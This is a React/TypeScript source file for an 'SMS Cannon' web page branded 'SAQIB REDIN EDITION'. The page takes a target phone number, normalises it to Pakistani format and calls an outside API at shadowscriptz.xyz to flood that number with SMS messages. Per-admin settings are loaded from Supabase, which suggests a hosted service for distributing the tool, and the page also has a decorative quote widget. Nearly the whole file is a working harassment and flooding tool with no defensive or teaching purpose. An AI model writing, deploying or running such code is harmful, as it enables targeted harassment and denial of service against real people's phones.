import React, { useState, useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { 
  Skull, 
  Flame, 
  Bomb, 
  Zap, 
  History as HistoryIcon,
  Phone,
  ExternalLink,
  Wand2,
  Activity,
  ShieldAlert,
  Ghost,
  MessageSquare
} from 'lucide-react';
import 'bootstrap-icons/font/bootstrap-icons.css';
import { SmsBomber } from './admin-dashboard/types';

export default function SmsBomberView() {
  const { admin_username } = useParams();
  const [bomberConfig, setBomberConfig] = useState<SmsBomber | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  
  const [targetNumber, setTargetNumber] = useState('923001234567');
  const [isBombing, setIsBombing] = useState(false);
  const [bombResponse, setBombResponse] = useState('🔴 Ready for action');
  const [log, setLog] = useState<string[]>(['💀 3D Console active | SAQIB REDIN EDITION', '💀 SMS BOMBER + FORTUNE BLAST ready']);
  
  const [fortuneMessage, setFortuneMessage] = useState('Click the crimson blast');
  const [countdown, setCountdown] = useState<number | null>(null);
  const [fortuneHistory, setFortuneHistory] = useState<string[]>([]);
  const [isBlasting, setIsBlasting] = useState(false);

  const consoleRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (admin_username) {
      fetchBomberConfig(admin_username);
    }
  }, [admin_username]);

  const addLog = (msg: string, icon = '💀') => {
    setLog(prev => [...prev, `${icon} ${msg}`].slice(-30));
    setTimeout(() => {
      if (consoleRef.current) {
        consoleRef.current.scrollTop = consoleRef.current.scrollHeight;
      }
    }, 50);
  };

  const fetchBomberConfig = async (username: string) => {
    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('sms_bombers')
        .select('*')
        .eq('admin_username', username)
        .limit(1)
        .maybeSingle();
        
      if (error || !data) {
        console.error("Supabase Error:", error);
        setError('SMS Bomber tool not found or inactive.');
      } else {
        setBomberConfig(data);
        // Increment view count
        try {
          await supabase.rpc('increment_sms_bomber_views', { bomber_id: data.id });
        } catch (e) {}
      }
    } catch (err) {
      setError('Failed to load bomber config.');
    } finally {
      setLoading(false);
    }
  };

  const cleanNumber = (raw: string) => {
    let c = raw.replace(/[\s\-\(\)]/g,'').replace(/^\+/,'').replace(/\D/g,'');
    if(!c) return null;
    if(c.startsWith('00')) c = c.substring(2);
    // Pakistan specific logic
    if(c.length === 10 && c.startsWith('3')) c = '92' + c;
    else if(c.length === 11 && c.startsWith('03')) c = '92' + c.substring(2);
    else if(c.length === 12 && c.startsWith('923')) c = c;
    else if(!c.startsWith('92') && c.length >= 10 && c.length <= 12) c = '92' + c.slice(-10);
    
    if(c.startsWith('92') && c.length >= 11 && c.length <= 13) return c;
    return null;
  };

  const handleBomb = async () => {
    if(isBombing) return;
    if(!targetNumber) {
      addLog('Enter phone number!', '⛔');
      setBombResponse('❌ Invalid number: empty field');
      return;
    }
    
    const num = cleanNumber(targetNumber);
    if(!num) {
      addLog(`Invalid number format: ${targetNumber}`, '⛔');
      setBombResponse('❌ Error: invalid number structure. Use 923xxxxxxxxx');
      return;
    }

    setIsBombing(true);
    setBombResponse('⏳ Triggering 3D SMS flood via SAQIB CANNON...');
    addLog(`Striking target: ${num}`, '🚀');

    try {
      const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${num}`;
      const res = await fetch(apiUrl);
      const text = await res.text();
      
      if(res.ok) {
        addLog(`SMS bomb activated → ${num} | API responded`, '🔥');
        setBombResponse(`✅ Bombardment triggered! Target: ${num}`);
      } else {
        throw new Error(`HTTP ${res.status}`);
      }
    } catch (err: any) {
      addLog(`SMS bomb error: ${err.message}`, '⛔');
      setBombResponse(`❌ Attack failed: ${err.message}. API unstable.`);
    } finally {
      setIsBombing(false);
    }
  };

  const fortuneQuotes = [
    "💀 'Redin's law: conquer the digital underworld.' — Saqib",
    "🔥 'Blast limits like a true ghost in 3D.'",
    "⚡ 'Every SMS echoes power. Rise above.'",
    "🩸 'Through crimson flames, I forge destiny.' — SAQIB",
    "🎯 'Stay low, strike hard. SMS code never lies.'",
    "🌋 'Explode beyond expectations. Fortune favors the bold.'",
    "👑 'King of SMS storms. Saqib legacy.'"
  ];

  const handleFortuneBlast = async () => {
    if(isBlasting) return;
    setIsBlasting(true);
    
    for(let i = 3; i > 0; i--) {
      setCountdown(i);
      await new Promise(resolve => setTimeout(resolve, 450));
    }
    setCountdown(null);

    const randomMsg = fortuneQuotes[Math.floor(Math.random() * fortuneQuotes.length)];
    setFortuneMessage(randomMsg);
    setFortuneHistory(prev => [randomMsg, ...prev].slice(0, 5));
    addLog(`Fortune blast: ${randomMsg.substring(0, 40)}...`, '🌀');
    setIsBlasting(false);
  };

  if (loading) {
    return (
      <div className="flex-1 flex items-center justify-center min-h-screen bg-[#020001]">
        <Activity className="w-10 h-10 text-red-600 animate-spin" />
      </div>
    );
  }

  if (error || !bomberConfig) {
    return (
      <div className="flex-1 flex items-center justify-center min-h-screen bg-[#020001] text-white">
        <div className="text-center p-8 bg-red-950/20 border border-red-900/50 rounded-2xl max-w-md">
          <ShieldAlert className="w-16 h-16 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl text-red-400 font-bold mb-2">ACCESS DENIED</h2>
          <p className="text-red-900 text-sm font-mono">{error || 'Terminal inactive.'}</p>
        </div>
      </div>
    );
  }

  const themeColor = bomberConfig.theme_color || '#ff3a3a';

  return (
    <div 
      className="min-h-screen bg-[#020001] text-zinc-100 font-sans p-4 md:p-8 selection:bg-red-500 selection:text-white bg-cover bg-center bg-no-repeat bg-fixed"
      style={bomberConfig.bg_image_url ? { backgroundImage: `url(${bomberConfig.bg_image_url})` } : {}}
    >
      {bomberConfig.bg_image_url && <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-0"></div>}
      <style>{`
        @keyframes float {
          0% { transform: translateZ(20px) rotateX(1deg); }
          50% { transform: translateZ(40px) rotateX(-1deg); }
          100% { transform: translateZ(20px) rotateX(1deg); }
        }
        .animate-3d-float {
          animation: float 6s ease-in-out infinite;
          transform-style: preserve-3d;
        }
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: ${themeColor}; border-radius: 10px; }
      `}</style>

      {/* 3D Background layer */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
        {[...Array(20)].map((_, i) => (
           <div 
             key={i}
             className="absolute bg-red-600/10 rounded-full blur-3xl animate-pulse"
             style={{
               width: Math.random() * 300 + 100,
               height: Math.random() * 300 + 100,
               left: Math.random() * 100 + '%',
               top: Math.random() * 100 + '%',
               animationDuration: Math.random() * 5 + 3 + 's',
               animationDelay: Math.random() * 5 + 's'
             }}
           />
        ))}
      </div>

      <div className="max-w-xl mx-auto relative z-10 animate-3d-float">
        <div className="bg-[#0a0305]/90 backdrop-blur-2xl border border-red-500/30 rounded-[3rem] overflow-hidden shadow-[0_40px_70px_-10px_rgba(0,0,0,0.9)]">
          {/* Header */}
          <div className="bg-gradient-to-br from-red-900/40 to-black p-8 text-center border-b border-red-500/50 relative">
             <div className="relative inline-block mb-4">
                <div className="absolute inset-0 rounded-full border-2 border-red-500 animate-ping opacity-20"></div>
                <div className="w-24 h-24 rounded-full border-4 border-red-500 p-1 bg-black overflow-hidden shadow-[0_0_30px_rgba(239,68,68,0.5)]">
                    <img 
                      src={bomberConfig.bg_image_url || "https://i.postimg.cc/1XkJtW0g/dark-red-avatar.png"} 
                      alt="Avatar" 
                      className="w-full h-full object-cover rounded-full"
                      onError={(e) => e.currentTarget.src = 'https://cdn-icons-png.flaticon.com/512/2761/2761490.png'}
                    />
                </div>
             </div>
             
             <div className="relative">
                <div className="absolute -inset-1 bg-gradient-to-r from-red-600 to-red-900 blur opacity-20"></div>
                <div className="relative bg-black/80 px-6 py-2 rounded-full border border-red-500 inline-flex items-center gap-3">
                   <Skull className="w-6 h-6 text-red-500" />
                   <h1 className="text-2xl font-black tracking-tighter uppercase font-mono bg-gradient-to-b from-white to-red-500 bg-clip-text text-transparent">
                      {bomberConfig.name}
                   </h1>
                   <Flame className="w-6 h-6 text-red-500" />
                </div>
             </div>

             {bomberConfig.admin_name && (
                <p className="mt-3 text-red-500/70 font-bold uppercase tracking-widest text-[10px]">Commanding: {bomberConfig.admin_name}</p>
             )}
             
             <div className="mt-4 inline-flex items-center gap-2 bg-black/60 px-4 py-1.5 rounded-full border border-red-500/30 text-[9px] font-bold text-red-200 tracking-widest uppercase">
                <Zap className="w-3 h-3 text-red-400" /> Redin Multi-Flood Edition <Zap className="w-3 h-3 text-red-400" />
             </div>

             <div className="absolute top-4 right-4 flex gap-2">
                {bomberConfig.main_website_link && (
                  <a href={bomberConfig.main_website_link} target="_blank" rel="noopener noreferrer" className="p-2 bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white border border-red-500/20 rounded-full transition-all">
                    <ExternalLink className="w-4 h-4" />
                  </a>
                )}
             </div>
          </div>

          {/* Tools Grid */}
          <div className="p-6 md:p-8 space-y-8">
            
            {/* SMS Bomber Section */}
            <div className="space-y-4">
              <div className="flex items-center gap-3 border-l-4 border-red-600 pl-4 mb-4">
                 <Bomb className="w-6 h-6 text-red-500" />
                 <h2 className="text-xl font-black uppercase font-mono tracking-tight">SMS Cannon</h2>
              </div>
              
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-red-300/60 uppercase tracking-[0.2em]">Target Identification</label>
                <div className="flex items-center bg-black/60 border-2 border-red-900/50 rounded-2xl overflow-hidden focus-within:border-red-500 transition-colors shadow-inner">
                   <div className="px-4 py-4 text-red-500 border-r border-red-900/30">
                      <Phone className="w-5 h-5" />
                   </div>
                   <input 
                     type="tel" 
                     value={targetNumber}
                     onChange={(e) => setTargetNumber(e.target.value)}
                     placeholder="923xxxxxxxxx"
                     className="flex-1 bg-transparent px-4 py-4 text-red-500 font-mono font-bold text-lg outline-none placeholder:text-red-950"
                   />
                </div>
              </div>

              <button 
                onClick={handleBomb}
                disabled={isBombing}
                className="w-full bg-gradient-to-b from-red-600 to-red-900 hover:from-red-500 hover:to-red-800 disabled:opacity-50 text-white font-black py-4 rounded-3xl shadow-lg shadow-red-600/30 active:translate-y-1 transition-all flex items-center justify-center gap-3 uppercase tracking-tighter"
              >
                 {isBombing ? <Activity className="w-5 h-5 animate-spin" /> : <Skull className="w-5 h-5" />}
                 {isBombing ? 'Bombardment Active...' : 'Ignite SMS Bomber'}
              </button>

              <div className="bg-black/40 border border-red-900/30 p-3 rounded-2xl text-[10px] font-mono text-red-300/80 flex items-center gap-2">
                 <div className={`w-2 h-2 rounded-full ${isBombing ? 'bg-red-500 animate-pulse' : 'bg-green-500'} shadow-[0_0_8px_currentColor]`}></div>
                 {bombResponse}
              </div>
            </div>

            {/* Fortune Section */}
            <div className="space-y-4 pt-4 border-t border-red-900/20">
               <div className="flex items-center gap-3 border-l-4 border-red-600 pl-4 mb-4">
                 <Zap className="w-6 h-6 text-red-500" />
                 <h2 className="text-xl font-black uppercase font-mono tracking-tight">Fortune Blast</h2>
               </div>

               <button 
                 onClick={handleFortuneBlast}
                 disabled={isBlasting}
                 className="w-full bg-[#1a0505] hover:bg-[#2b0a0a] border border-red-600 border-b-4 hover:border-b-2 active:border-b-0 active:translate-y-1 text-red-500 font-black py-4 rounded-3xl transition-all flex items-center justify-center gap-3 uppercase shadow-xl"
               >
                  <i className="bi bi-magic text-xl"></i> Blast Mystery Message
               </button>

               <div className="bg-[#050001] border-l-8 border-red-600 p-5 rounded-2xl relative overflow-hidden group min-h-[80px] flex items-center">
                  <div className="absolute inset-0 bg-red-600/5 group-hover:bg-red-600/10 transition-colors"></div>
                  {countdown !== null ? (
                    <div className="w-full text-center text-4xl font-black text-red-600 animate-bounce">
                       ⚡ {countdown} ⚡
                    </div>
                  ) : (
                    <p className="text-red-200 font-bold italic relative z-10 animate-in fade-in slide-in-from-left-2">{fortuneMessage}</p>
                  )}
               </div>

               {fortuneHistory.length > 0 && (
                 <div className="space-y-2">
                    <p className="text-[9px] font-bold text-zinc-600 uppercase tracking-widest pl-1">Recent Blasts</p>
                    <div className="space-y-1">
                       {fortuneHistory.map((q, i) => (
                         <div key={i} className="text-[10px] text-zinc-500 border-l border-red-900/50 pl-3 py-1 animate-in fade-in">
                            🔥 {q.substring(0, 50)}...
                         </div>
                       ))}
                    </div>
                 </div>
               )}
            </div>

            {/* Console */}
            <div className="space-y-3 pt-4">
               <div className="flex items-center justify-between px-1">
                  <span className="text-[9px] font-bold text-red-500/50 uppercase tracking-widest">3D Real-time Output</span>
                  <Activity className="w-3 h-3 text-red-500 animate-pulse" />
               </div>
               <div 
                 ref={consoleRef}
                 className="bg-black border border-red-500/20 rounded-2xl p-4 h-32 overflow-y-auto custom-scrollbar font-mono text-[10px] space-y-1 shadow-inner"
               >
                  {log.map((line, i) => (
                    <div key={i} className="text-red-500/80 leading-tight border-b border-white/[0.02] pb-1 animate-in slide-in-from-left-1">
                       {line}
                    </div>
                  ))}
               </div>
            </div>

          </div>

          {/* Footer */}
          <div className="bg-black/50 p-4 border-t border-red-500/20 flex items-center justify-center gap-4">
             <div className="text-[9px] font-bold text-red-900 uppercase tracking-widest">Power of SAQIB REDIN · 3D Multi-Flood</div>
             {bomberConfig.channel_link && (
               <a href={bomberConfig.channel_link} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 text-[9px] font-bold text-red-500 hover:text-red-400 uppercase tracking-widest border-l border-red-900/30 pl-4 transition-colors">
                  <MessageSquare className="w-3 h-3" /> HQ HQ
               </a>
             )}
          </div>
        </div>
      </div>
    </div>
  );
}
